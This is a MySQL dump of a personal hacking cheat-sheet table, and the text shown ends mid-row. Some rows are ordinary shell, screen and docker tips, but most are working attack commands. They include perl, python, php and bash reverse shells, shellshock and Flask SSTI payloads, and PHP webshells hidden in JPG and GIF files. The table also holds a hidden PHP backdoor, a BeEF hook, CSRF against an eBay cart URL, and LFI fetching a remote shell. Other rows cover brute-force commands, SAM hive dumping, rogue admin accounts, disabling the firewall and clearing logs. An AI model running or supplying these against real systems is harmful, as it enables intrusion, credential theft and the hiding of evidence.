-- MySQL dump 10.13  Distrib 5.7.18, for Linux (x86_64)
--
-- Host: localhost    Database: my_knx2010
-- ------------------------------------------------------
-- Server version	5.7.18-0ubuntu0.16.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `knx`
--

DROP TABLE IF EXISTS `knx`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `knx` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `data` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `descrizione` mediumtext COLLATE utf8_bin NOT NULL,
  `comando` longtext CHARACTER SET ucs2 COLLATE ucs2_bin NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=1250 DEFAULT CHARSET=utf8 COLLATE=utf8_bin;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `knx`
--

LOCK TABLES `knx` WRITE;
/*!40000 ALTER TABLE `knx` DISABLE KEYS */;
INSERT INTO `knx` VALUES (3,'2017-06-09 08:20:23','\nenable ip forward','echo 1 > /proc/sys/net/ipv4/ip_forward '),(4,'2017-06-09 08:20:23','adb multiple devices','adb -s XXXXXX shell'),(5,'2017-06-09 08:20:23','adb view installed packages','pm list packages'),(6,'2017-06-09 08:20:23','adb intent start browser','adb shell am start -a android.intent.action.VIEW -d https://knxsecurity.org'),(7,'2017-06-09 08:20:23','adb path of installed software','pm path <package name>'),(8,'2017-06-09 08:20:23','wifi airepaly','aireplay-ng -0 3 –a <macaddress of the ap> mon0 '),(9,'2017-06-09 08:20:23','apache 404 custom page ','RewriteEngine on   ErrorDocument 404 / '),(10,'2017-06-09 08:20:23','arpspoof man in the middle first console\n','arpspoof -i tap0 -t 172.16.5.1 -r 172.16.5.5'),(11,'2017-06-09 08:20:23','arpspoof man in the middle second console','arpspoof -i tap0 -t 172.16.5.5 -r 172.16.5.1 '),(12,'2017-06-09 08:20:23','elevate Alfa power','iw reg set BO && iwconfig wlan0 txpower 30 '),(16,'2017-06-09 08:20:23','backup packages','dpkg --get-selections > lista_pacchetti '),(17,'2017-06-09 08:20:23','base64 without newline','base64 -w 0 test '),(18,'2017-06-09 08:20:23','vim escape',':!bash'),(19,'2017-06-09 08:20:23','Bash Tricks','ALT+ .  --> incolla l\'argomento dell\'ultimo comando eseguito '),(20,'2017-06-09 08:20:23','Bash Tricks','(cd /tmp && ls)  --> salta nella cartella, esegue il comando e torna indietro '),(21,'2017-06-09 08:20:23','Bash Tricks','^ciao^casa    --> esegue l\'ultimo comando sostituendo ciao con casa '),(22,'2017-06-09 08:20:23','Bash Tricks','CTRL + a  -->  va all\'inizio della riga '),(23,'2017-06-09 08:20:23','Bash Tricks','CTRL + d --> esce '),(24,'2017-06-09 08:20:23','Bash Tricks','CTRL + e --> va alla fine della riga '),(25,'2017-06-09 08:20:23','Bash Tricks','CTRL + l --> clear '),(26,'2017-06-09 08:20:23','Bash Tricks','CTRL+u .... CTRL+y  --> inizia a scrivere un comando, ci si ricorda che manca qualcosa si taglai il comando, si cerca quello che manca, si scrive e si riprende il comando '),(27,'2017-06-09 08:20:23','Bash Tricks','dd if=/dev/dsp | ssh -c arcfour -C username@host dd of=/dev/dsp   --> manda l\'output del tuo microfono fuori dagli altoparlanti del pc remoto '),(28,'2017-06-09 08:20:23','Bash Tricks','disown -a && exit  --> chiude una shell mantenendo i sottoprocessi attivi '),(29,'2017-06-09 08:20:23','Bash Tricks','ESC .    --> incolla l\'argomento dell\'ultimo comando eseguito '),(30,'2017-06-09 08:20:23','Bash Tricks','find . -type f -exec sh -c \'>{}\' \\;   -->  svuota tutti file di una cartella '),(31,'2017-06-09 08:20:23','Bash Tricks','mount -t tmpfs tmpfs /mnt -o size=1024m  --> monta un ram disk temporaneo '),(32,'2017-06-09 08:20:23','Bash Tricks','sshfs name@server:/path/to/folder /path/to/mount/point  --> monta filesystem tramite ssh '),(33,'2017-06-09 08:20:23','Bash Tricks','ssh user@host cat /path/to/remotefile | diff /path/to/localfile -  --> compara un file remoto con uno locale '),(34,'2017-06-09 08:20:23','Bash Tricks','sudo !!    -->    esegui l\'ultimo comando come root '),(35,'2017-06-09 08:20:23','Bash Tricks','^z; bg; disown  --> chiude una shell mantenendo i sottoprocessi attivi '),(36,'2017-06-09 08:20:23','dump bcd boot windows','bcdedit /export <filename>'),(37,'2017-06-09 08:20:23','beef hook','<script src=\"http://address:3000/hook.js\"></script> '),(38,'2017-06-09 08:20:23','interactive shell','/bin/sh -i'),(41,'2017-06-09 08:20:23','Changes an inactive / disabled account to active. ','net user username /active:yes /domain '),(42,'2017-06-09 08:20:23','remote command on every domain pc','net session | ?{$_ -match \'^\\\\\\S*\' }|% {$_.split()[0]}| ForEach-Object -Process {psexec $_ cmd /c COMANDO} '),(43,'2017-06-09 08:20:23','check syntax','php -l nomefile.php '),(44,'2017-06-09 08:20:23','create dictonary from web page','cewl https://it.wikipedia.org/wiki/Leonardo_da_Vinci -w passwords.txt '),(45,'2017-06-09 08:20:23','make evil pg','echo \'FFD8FFEo\' | xxd -r -p > test.jpg && echo \'<?php phpinfo(); ?>\' >> test.jpg '),(46,'2017-06-09 08:20:23','run vbscipt','cscript.exe <script js/vbs/c#>'),(695,'2017-06-09 08:20:23','screen hotkeys','detach	C-a d\ndetach and logout (quick exit)	C-a D D\nexit screen	C-a \\ Exit all of the programs in screen. (not recommended)\nforce-exit screen	C-a C-\\ (not recommended)\ngetting out of the screen session	exit\ncreate new window	C-a c\nchange to last-visited active window	C-a C-a (commonly used to flip-flop between two windows)\nchange to window by number	C-a <number> (only for windows 0 to 9)\nchange to window by number or name	C-a \' <number or title>\nchange to next window in list	C-a n or C-a <space>\nchange to previous window in list	C-a p or C-a <backspace>\nsee window list	C-a \" (allows you to select a window to change to)\nshow window bar	C-a w (if you don\'t have window bar)\nclose current window	Close all applications in the current window (including shell)\nkill current window	C-a k (not recommended)\nkill all windows	C-a \\ (not recommended)\nrename current window	C-a A\nsplit display horizontally	C-a S\nsplit display vertically	C-a | or C-a V (for the vanilla vertical screen patch)\njump to next display region	C-a tab\nremove current region	C-a X\nremove all regions but the current one	C-a Q\n'),(694,'2017-06-09 08:20:23','screen','start a new screen session with session name -- screen -S <name>\nlist running sessions/screens -- screen -ls\nattach to a running session -- screen -x\n… to session with name -- screen -r <name>\nthe “ultimate attach” -- screen -dRR (Attaches to a screen session. If the session is attached elsewhere, detaches that other display. If no session exists, creates one. If multiple sessions exist, uses the first one.)\n\ndetach a running session -- screen -d <name>\n'),(693,'2017-06-09 08:20:23','flask ssti','{{ request.environ[\'werkzeug.server.shutdown\']() }}\n{{ config.items() }}\n{{ config.from_object(\'os\') }}\n {{\'\'.__class__.mro()[1].__subclasses__()[46](\'touch /tmp/rce\',shell=True)}}\n{{ \'\'.__class__.__mro__ }}\n{{ \'\'.__class__.__mro__[2].__subclasses__() }}\n{{ \'\'.__class__.__mro__[2].__subclasses__()[40](\'/etc/passwd\').read() }}\n{{ \'\'.__class__.__mro__[2].__subclasses__()[40](\'/tmp/owned.cfg\', \'w\').write(\'<malicious code here>\'\') }}\n{{ config.from_pyfile(\'/tmp/owned.cfg\') }}\n{{ \'\'.__class__.__mro__[2].__subclasses__()[40](\'/tmp/owned.cfg\', \'w\').write(\'from subprocess import check_output\\n\\nRUNCMD = check_output\\n\') }}\n\n{{ config[\'RUNCMD\'](\'/usr/bin/id\',shell=True) }}\n'),(690,'2017-06-09 08:20:23','ssh chiavi keys','copiare la chiave pubblica nel file remoto ~/.ssh/authorized_keys\npoi\nchmod 755 ~/.ssh/\nchmod 644 ~/.ssh/authorized_keys\n'),(689,'2017-06-09 08:20:23','iptable allows only shh','iptables -P INPUT DROP\niptables -P OUTPUT DROP\niptables -A INPUT -i lo -j ACCEPT\niptables -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT\niptables -A OUTPUT -o lo -j ACCEPT\niptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT\n'),(687,'2017-06-09 08:20:23','Docker command 101','docker ps -> vedo i cointainer che stanno girando\ndocker ps -a -> vedo tutti, anche quelli che non stanno girando\ndocekr images -> mostra le immagini installate sul sistema\ndocker pull nginx:1.10.2-alpine --> scarica in locale l\'immagine \ndocker rm nome --> rimuove quel container\ndocker run --name nome -d -p 80:80 ngnix:1.10.2-alpine  -> fa partire nginx in modalita demone con nome e porta 80\ndocker exec -ti nome /bin/sh -> esegue un comando (/bin/sh) dentro al container in modo interattivo\n'),(686,'2017-06-09 08:20:23','strip out all unicode characters','iconv -c -f utf-8 -t ascii file.txt\n'),(83,'2017-06-09 08:20:23','curl burp','curl -x 127.0.0.1:8080 challenge02.root-me.org:60005 '),(84,'2017-06-09 08:20:23','curl cookies','curl -b cookies.txt -c cookies.txt -F title=\"gotpwn\" -F image=@\'filename\' -F category=\"1\" -F \"Submit=Add\" http://sitovulnerabile/admin/index.php  '),(85,'2017-06-09 08:20:23','curl post data','curl -X POST -H \"Content-Type: application/json\" -d \'{\"username\":\"xyz\",\"password\":\"xyz\"}\' http://vulnerable/register '),(86,'2017-06-09 08:20:23','curl put shell','curl -v -X PUT -0 -d \'<?php passthru($_GET[\'cmd\']); ?>\' http://192.168.1.113/test '),(87,'2017-06-09 08:20:23','curl verb tamper','curl -v -X OPTIONS http://192.168.1.113/test '),(88,'2017-06-09 08:20:23','clear windows log','del %WINDIR%\\*.log /a /s /q /f'),(89,'2017-06-09 08:20:23','dig','dig a domain-name-here.com @nameserver '),(90,'2017-06-09 08:20:23','dig','dig axfr domain-name-here.com @nameserver'),(91,'2017-06-09 08:20:23','dig','dig mx domain-name-here.com @nameserver'),(92,'2017-06-09 08:20:23','disable history','unset HISTFILE '),(94,'2017-06-09 08:20:23','DNS Discovery','nmap -sS -sU -p53 -n 10.92.168.1.0/24'),(95,'2017-06-09 08:20:23','DNS Zone transfer','dig @192.168.1.100 domain.com -t AXFR'),(96,'2017-06-09 08:20:23','DNS zone transfer','nslookup \n server 192.168.1.100 \n ls -d domain.com'),(97,'2017-06-09 08:20:23','dominio email','host -t mx example.com\n'),(99,'2017-06-09 08:20:23','ebay CRSF on webhosting','<meta name=\"referrer\" content=\"no-fererrer\" /><img src=\"http://cart.payments.ebay.it/sc/add?ssPageName=CART:ATC&item=iid:141824672979,gty:1\" '),(100,'2017-06-09 08:20:23','ebay CRSF local','<img src=\"http://cart.payments.ebay.it/sc/add?ssPageName=CART:ATC&item=iid:141824672979,gty:1\" /> '),(101,'2017-06-09 08:20:23','shellshock','echo -e \"HEAD /cgi-bin/status HTTP/1.1\nUser-Agent: () { :;}; echo \\$(&lt;/etc/passwd)\nHost: vulnerable\nConnection: close\n\n\" | nc TARGET 80'),(102,'2017-06-09 08:20:23','shellshock','echo -e \"HEAD /cgi-bin/status HTTP/1.1\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\nHost: vulnerable\nConnection: close\n\n\" | nc TARGET 80'),(103,'2017-06-09 08:20:23','spawn shell','echo os.system(\'/bin/bash\')'),(104,'2017-06-09 08:20:23','delete all ines that contains foobar','sed -s test.xtx <<< $\'g/foobar/d\nw\' '),(105,'2017-06-09 08:20:23','snmp enumeration','enum4linux -a target-ip'),(108,'2017-06-09 08:20:23','enum example','enum -S 10.130.40.80 '),(109,'2017-06-09 08:20:23','find example','find /etc/ -maxdepth 1 -name *.conf -type f -exec ls -la {} \\; 2>/dev/null '),(110,'2017-06-09 08:20:23','find example','find / -name \"id_dsa*\" -o -name \"id_rsa*\" -o -name \"known_hosts\" -o -name \"authorized_hosts\" -o -name \"authorized_keys\" 2>/dev/null |xargs -r ls -la '),(111,'2017-06-09 08:20:23','find example','find / ! -path \"*/proc/*\" -perm -2 -type f -print 2>/dev/null '),(112,'2017-06-09 08:20:23','find example','find / -perm -2000 -type f 2>/dev/null '),(113,'2017-06-09 08:20:23','find example','find / -perm -2000 -type f 2>/dev/null |grep -v /proc/ '),(114,'2017-06-09 08:20:23','find example','find / -perm -4000 -type f 2>/dev/null '),(115,'2017-06-09 08:20:23','find example','find / -uid 0 -perm -4000 -type f 2>/dev/null '),(116,'2017-06-09 08:20:23','find example','find /var/log -name *.log -type f -exec ls -la {} \\; 2>/dev/null '),(117,'2017-06-09 08:20:23','find example','find /var/log -type f -exec ls -la {} \\; 2>/dev/null '),(118,'2017-06-09 08:20:23','awk','ls -l | awk \'!/tunnel/\'   '),(119,'2017-06-09 08:20:23','extract username from /etc/passwd','grep -v -E \"^#\" /etc/passwd | awk -F: \'$3 == 0 { print $1}\' '),(120,'2017-06-09 08:20:23','ettercap example','ettercap -T -q -F ig.ef -M ARP // // '),(121,'2017-06-09 08:20:23','ettercap example','ettercap -T -q -F ig.ef -M ARP /192.168.1.47/ // '),(126,'2017-06-09 08:20:23','sql command line dump','mysqldump -uUser1 -pPassword1 --opt Database1 > /root/backup/Database1.sql '),(131,'2017-06-09 08:20:23','flv to mp3','ffmpeg -i  \'INPUT.flv\' -vn -ac 2 -acodec copy  -y   \'OUTPUT.mp3\' '),(132,'2017-06-09 08:20:23','create custom dictionary','crunch 5 5 xyz '),(133,'2017-06-09 08:20:23','compile ettercap filter','etterfilter ig.filter -o ig.ef '),(137,'2017-06-09 08:20:23','policy','gpresult /H gpols.htm'),(138,'2017-06-09 08:20:23','policy','gpresult /z'),(140,'2017-06-09 08:20:23','Hash etc/passwd','python -c \'import crypt; print crypt.crypt(\"knx\", \"$6$saltsalt$\")\'  '),(141,'2017-06-09 08:20:23','HEX TO ASCII','echo 63c6456.. | xxd -p -r '),(142,'2017-06-09 08:20:23','hping3 scan example','hping3 10.50.97.5 -S --scan known '),(144,'2017-06-09 08:20:23','esempio httprint','httprint -P0 -h 1.2.3.4 -s /usr/share/httprint/signatures.txt  '),(145,'2017-06-09 08:20:23','esempio httprint','httprint -P0 -h <target host> -s <signature file> '),(146,'2017-06-09 08:20:23','esempio hydra','hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V'),(147,'2017-06-09 08:20:23','esempio hydra','hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V'),(148,'2017-06-09 08:20:23','esempio hydra','hydra -L user.txt -P passlist pentesteracademylab.appspot.com http-get /lab/webapp/digest/1 '),(149,'2017-06-09 08:20:23','esempio hydra','hydra -L user.txt -P pass.txt <service://server> <options> '),(150,'2017-06-09 08:20:23','esempio hydra','hydra -L user.txt -P pass.txt telnet://target.server '),(151,'2017-06-09 08:20:23','esempio hydra','hydra pentesteracademylab.appspot.com http-form-get \"/lab/webapp/1:email=^USER^&password=^PASS^:Failed\" -L users.txt -P pass.txt -t 20 -o results.txt  '),(152,'2017-06-09 08:20:23','esempio hydra','hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V'),(153,'2017-06-09 08:20:23','bash ifconfig','ifconfig eth0 192.168.1.114 netmask 255.255.255.0 '),(154,'2017-06-09 08:20:23','iframe invisibile','<iframe src=http://172.16.5.34:8081/fdos8h49dzUt851 width=1 height=1 style=”visibility:hidden; position:absolute”></iframe> '),(155,'2017-06-09 08:20:23','esempio ike','./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1'),(156,'2017-06-09 08:20:23','esempio ike','./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic'),(157,'2017-06-09 08:20:23','esempio ike','ike-scan –M –A –n example_group -P hash-file.txt TARGET-IP'),(158,'2017-06-09 08:20:23','sql command line import dump','C:\\Programmi\\EasyPHP 3.0\\mysql\\bin\\mysql.exe -u root -p -h localhost rt < zelune.sql '),(159,'2017-06-09 08:20:23','in questo modo socat ascolterà sulla porta 8080 localhost inoltrerà tutte le richieste all\'indirizzo IP 10.10.10.100  sulla porta 80 passando attraverso a TOR sulla porta 9050  dove TOR default port 9050 Privoxy default port 8118','socat TCP4-LISTEN:8080,fork SOCKS4a:127.0.0.1:10.10.10.100:80,socksport=9050 &  '),(160,'2017-06-09 08:20:23','Inseire all\'inizio della riga (in questo caso il #)','sed -e \'s/^/#/g\' '),(161,'2017-06-09 08:20:23','inserire commenti in una gif','gifsicle --comment \"<?php passthru($_GET[\'cmd\']); ?>\" <gdf.gif > test.gif '),(164,'2017-06-09 08:20:23','ipconfig','ipconfig /displaydns'),(165,'2017-06-09 08:20:23','esempio john','john --format=descrypt hash --show'),(166,'2017-06-09 08:20:23','esempio john','john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt'),(167,'2017-06-09 08:20:23','esempio john','john --list=formats '),(168,'2017-06-09 08:20:23','esempio john','john /tmp/hash.txt --format=nt '),(169,'2017-06-09 08:20:23','esempio john','john --wordlist=/usr/share/wordlists/rockyou.txt hashes'),(170,'2017-06-09 08:20:23','keimpx','keimpx.py –t <target> -U <username> -P <Password> '),(171,'2017-06-09 08:20:23','lfi base64','http://www.example.com/index.php?m=php://filter/convert.base64-encode/resource=index '),(172,'2017-06-09 08:20:23','lfi php input','curl http://www.sito.com/index.php?view=php://input -d \"<?php system(\'wget http://www.shell.org/shell.txt -o shell.php\'); ?>\" '),(173,'2017-06-09 08:20:23','LIMIT 1,1  estrae il secondo risultato, LIMIT 5,10 estrae i dati dal numero 6 al 15 ','Il primo parametro identifica da dove partire ad estrarre (parte dal successivo), il secondo indica quanti estrarre '),(175,'2017-06-09 08:20:23','Locates insecurely registered executablea within the system registry on Windows 7.','reg query HKLM /s /d /f \"C:\\* *.exe\" | find /I \"C:\" | find /V \"\"\"\"'),(176,'2017-06-09 08:20:23','scan for cron','ls -aRl /etc/cron* | awk \'$1 ~ /w.$/\' 2>/dev/null '),(178,'2017-06-09 08:20:23','spawn shell lua','lua: os.execute(\'/bin/sh\') '),(179,'2017-06-09 08:20:23','-l = username -P = password (Looks for a wordlist) -e ns = checks for \'null\' password -t xx= How  many tasks to run at once -f = exit once it finds the first user/password -s = connect via SSL -vV = verbose mode (shows more info) 192.168.1.1 = IP address http-get = what to crack/method etc / = Page to crack - root','hydra -l admin -P /pentest/passwords/wordlists/g0tmi1k.lst -e ns -t 15 -f -s -vV 192.168.1.1 http-get / '),(180,'2017-06-09 08:20:23','medusa','medusa -h target_ip -u username -P path_to_password_list -M service_to_attack '),(181,'2017-06-09 08:20:23','Merge Two Files Side by Side','paste -d\" \" <first file> <second file> > <output file> '),(217,'2017-06-09 08:20:23','metasploit proxy','set Proxies socks4:127.0.0.1:8888 '),(219,'2017-06-09 08:20:23','modifichaimo il valore nologin dell\'utente apache per dare la shell','usermod -s /bin/sh -u apache    '),(221,'2017-06-09 08:20:23','mona','!mona config -set workingfolder c:\\mona\\%p '),(222,'2017-06-09 08:20:23','mona','!mona jmp -r esp -o '),(223,'2017-06-09 08:20:23','mona','!mona pattern_create 2000 '),(224,'2017-06-09 08:20:23','mona','!mona pattern_offset 37694136 '),(225,'2017-06-09 08:20:23','monitoring','airodump-ng mon0 '),(226,'2017-06-09 08:20:23','monitor mode','airmon-ng start wlan0 '),(227,'2017-06-09 08:20:23','mostra i premessi sulla cartella system32','icalcs c:\\windows\\system32  '),(228,'2017-06-09 08:20:23','mostra tutti i sevizi che non hanno nel pathname la directory system32 in quanto abbiamo visto che non abbiamo i permessi di  scrittura come semplice user','wmic service WHERE \"NOT PathName LIKE \"%system32%\" GET PathName, Name'),(230,'2017-06-09 08:20:23','Mount NFS share to /mnt/nfs ','mount 192.168.1.1:/vol/share /mnt/nfs'),(231,'2017-06-09 08:20:23','montare share windows','mount -t cifs -o username=user,password=pass,domain=blah //192.168.1.X/share-name /mnt/cifs'),(233,'2017-06-09 08:20:23','msfvenom','msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.13 -f raw > php-meter.php '),(236,'2017-06-09 08:20:23','msfvenom','msfvenom -p windows/shell_bind_tcp -f -c -a x86 -b \"x0a x0d\" badchars '),(237,'2017-06-09 08:20:23','msfvenom','msfvenom -p windows/shell_bind_tcp -f raw | - ndisam -u -      mostra la shellcode in assembly '),(238,'2017-06-09 08:20:23','MX Record','nslookup \n server 192.168.1.100 \n set q=MX \n domain.com'),(239,'2017-06-09 08:20:23','Name Server','nslookup \n server 192.168.1.100 \n set q=NS \n domain.com'),(240,'2017-06-09 08:20:23','Name server seconda parte','nslookup \n server 192.168.1.100 \n ns1.domain.com \n ns2.domain.com'),(242,'2017-06-09 08:20:23','netcat listen','nc -l -p 443'),(243,'2017-06-09 08:20:23','ncrack','ncrack –v –u administrator –P/pentest/passwords/wordlists/darkc0de.lst rdp://192.168.75.140 '),(245,'2017-06-09 08:20:23','netcat webserver','netcat -l -vv -p 80 < file_da_uploadare '),(246,'2017-06-09 08:20:23','net ','net config workstation  '),(247,'2017-06-09 08:20:23','netdiscover','netdiscover -r 192.168.1.0/24'),(248,'2017-06-09 08:20:23','net','net localgroup administrators /add hacker'),(249,'2017-06-09 08:20:23','netsh','netsh diag show all '),(250,'2017-06-09 08:20:23','netsh','netsh firewall set opmode disable   '),(251,'2017-06-09 08:20:23','netsh','netsh firewall set opmode enable    '),(252,'2017-06-09 08:20:23','netstat','netstat -tulpn'),(253,'2017-06-09 08:20:23','windows','net user hacker hacker /add'),(254,'2017-06-09 08:20:23','windows','net use \\TARGET\\IPC$ \"\" /u:\"\"'),(255,'2017-06-09 08:20:23','windows','net use Z: \\win-server\\share password  /user:domain\\janedoe /savecred /p:no'),(257,'2017-06-09 08:20:23','scan','nmap output Greppable format:  nmap –sS 192.168.15.1 –oG rafay '),(258,'2017-06-09 08:20:23','nmap output','XML Format:  nmap –sS 192.168.15.1 –oX <filename> '),(260,'2017-06-09 08:20:23','scan','nmap -p 80 --script http-brute --script-args  \'http-brute.hostname=pentesteracademylab.appspot.com,http-brute.method=POST,http-brute.path=/lab/webapp/basicauth,userdb=/root/users.txt,passwd=/root/password.txt\' -v pentesteracademylab.appspot.com -n '),(262,'2017-06-09 08:20:23','scan','nmap --script=banner 192.168.1.1 '),(264,'2017-06-09 08:20:23','scan','nmap --script=http-methods.nse 192.168.1.11 -n -p 80 '),(266,'2017-06-09 08:20:23','scan','nmap --script=oracle-sid-brute '),(267,'2017-06-09 08:20:23','scan','nmap --script=smb-check-vulns <target IP> '),(269,'2017-06-09 08:20:23','scan','nmap --script=smb-enum-users -p 445 192.168.1.10 --script-args smbuser=administrator,smbpass=password '),(271,'2017-06-09 08:20:23','update db ','nmap --script-updatedb'),(273,'2017-06-09 08:20:23','vulnerability assessment ','nmap --script=vuln 192.168.1.1'),(274,'2017-06-09 08:20:23','nmap sql injection','sqlmap ‐u http://192.168.11.35 --crawl=1 '),(275,'2017-06-09 08:20:23','scan','nmap -sT -p 161 192.168.X.XXX/254 -oG snmp_results.txt (then grep)'),(277,'2017-06-09 08:20:23','scan','nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156'),(280,'2017-06-09 08:20:23','scan','nmap -sV -O -p 443 --script ssl-heartbleed IP '),(281,'2017-06-09 08:20:23','scan','nmap -sV -p 161 --script=snmp-info TARGET-SUBNET'),(283,'2017-06-09 08:20:23','scan','nmap -v -n 192.168.101.8 -p3128 —script http-proxy-brute —script-args=\"userdb=users.txt\" '),(284,'2017-06-09 08:20:23','scan','nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.1.X'),(285,'2017-06-09 08:20:23','windows','nmblookup -A 192.168.1.10 '),(286,'2017-06-09 08:20:23','windows','nmblookup -A target'),(288,'2017-06-09 08:20:23','snmp','onesixtyone -c names -i hosts'),(289,'2017-06-09 08:20:23','openssl','openssl s_client -connect target.site:443 '),(295,'2017-06-09 08:20:23','spawn','perl -e \'exec \"/bin/sh\";\''),(297,'2017-06-09 08:20:23','perl reverse shell','perl -e \'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};\' '),(298,'2017-06-09 08:20:23','PHP Bypass Hard Coded Password','modificare il form con l\'editor del browser sostituendo la variabile pass in un array pass[]  spesso il controllo di php si confonde e ti fa loggare '),(299,'2017-06-09 08:20:23','PHP hidden backdoor 1 parte','@extract ($_REQUEST); '),(300,'2017-06-09 08:20:23','PHP hidden backdoor 2 parte','@die ($function($argument)); '),(301,'2017-06-09 08:20:23','PHP hidden backdoor 2 parte','usage: ?function=system&argument=ls -la '),(302,'2017-06-09 08:20:23','PHP Remote File Inclusion command shell using data:// | Application Security','data://text/plain;base64,PD8gcGhwaW5mbygpOyBkaWUoKTs%2fPg== '),(303,'2017-06-09 08:20:23','php reverse shell','php -r \'$sock=fsockopen(\"10.0.0.1\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");\' '),(304,'2017-06-09 08:20:23','php','php -S 0.0.0.0:80'),(305,'2017-06-09 08:20:23','lfi','PHP security exploit - list content of remote PHP file? data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg== '),(306,'2017-06-09 08:20:23','webshell','php shell *|* echo \'<?php $x=$_GET[\"x\"]; echo `$x`; ?>\' >> test.jpg '),(311,'2017-06-09 08:20:23','windows','plink.exe -P 22 -l root -pw \"1337\" -R 445:127.0.0.1:445 REMOTE-IP'),(333,'2017-06-09 08:20:23','powershell','post/windows/manage/powershell/exec_powershell'),(337,'2017-06-09 08:20:23','proxy','proxychains ssh -D 127.0.0.1:1011 -p 22 [email&#160;protected]/*  */'),(341,'2017-06-09 08:20:23','pth-winexe','1. settare una variabile d\'ambiente con l\'hash trovat : export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896   2. pth-winexe -U administrator //192.168.101.76 cmd '),(343,'2017-06-09 08:20:23','python','python3 -m http.server'),(344,'2017-06-09 08:20:23','spawn','python -c \'import pty;pty.spawn(\"/bin/bash\")\''),(345,'2017-06-09 08:20:23','python','python -m SimpleHTTPServer 80'),(346,'2017-06-09 08:20:23','python revrse shell','python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\' '),(347,'2017-06-09 08:20:23','python struct','import struct;  eip = struct.pack(\"I\", ocbffff7c0) '),(351,'2017-06-09 08:20:23','python webserver localhost only','python -c \'import BaseHTTPServer as bhs, SimpleHTTPServer as shs; bhs.HTTPServer((\"127.0.0.1\", 8888), shs.SimpleHTTPRequestHandler).serve_forever()\' '),(353,'2017-06-09 08:20:23','rdesktop risoluzione personalizzata','rdesktop -g 1920x1080'),(354,'2017-06-09 08:20:23','rdesktop share disco condiviso','rdesktop (ip) -r disk:share=/home/bayo/store'),(355,'2017-06-09 08:20:23','windows','reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f '),(356,'2017-06-09 08:20:23','windows','reg add [\\TargetIPaddr\\] [RegDomain][ \\Key ] '),(357,'2017-06-09 08:20:23','windows','reg export [RegDomain]\\[Key] [FileName] '),(358,'2017-06-09 08:20:23','windows','reg import [FileName ]'),(359,'2017-06-09 08:20:23','windows','reg query [\\TargetIPaddr\\] [RegDomain]\\[ Key ] /v [Valuename!] (you can to add /s for recurse all values )'),(360,'2017-06-09 08:20:23','windows','reg save HKLM\\SAM sam.hive (Save sam to a file)='),(361,'2017-06-09 08:20:23','windows','reg save HKLM\\Security security.hive  (Save security hive to a file)'),(362,'2017-06-09 08:20:23','windows','reg save HKLM\\System system.hive (Save system hive to a file)'),(364,'2017-06-09 08:20:23','restore pacchetti','sudo dpkg --set-selections < lista_pacchetti && sudo apt-get dselect-upgrade '),(365,'2017-06-09 08:20:23','reverse shell netcat alternative','127.0.0.1;bash -i >& /dev/tcp/192.168.11.5/9922 0>&1 '),(366,'2017-06-09 08:20:23','reverse shell netcat alternative','/bin /telnet 10.10.10.100 80 | /bin/bash | /bin/telnet 10.10.10.100 25 '),(367,'2017-06-09 08:20:23','reverse shell netcat alternative','mknod backpipe p && telnet 1.10.10.100 8080 0<backpipe | /bin/bash 1>backpipe '),(368,'2017-06-09 08:20:23','reverse shell netcat alternative','rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.229 1234 >/tmp/f '),(369,'2017-06-09 08:20:23','reverse shell proxy','http://bechtsoudis.com/archive/2012/06/08/using-ssh-socks-proxies-with-msf-reverse-tcp-payloads/index.html '),(370,'2017-06-09 08:20:23','reverse shell telnet doppio canale','/bin /telnet 10.10.10.100 80 | /bin/bash | /bin/telnet 10.10.10.100 25 '),(371,'2017-06-09 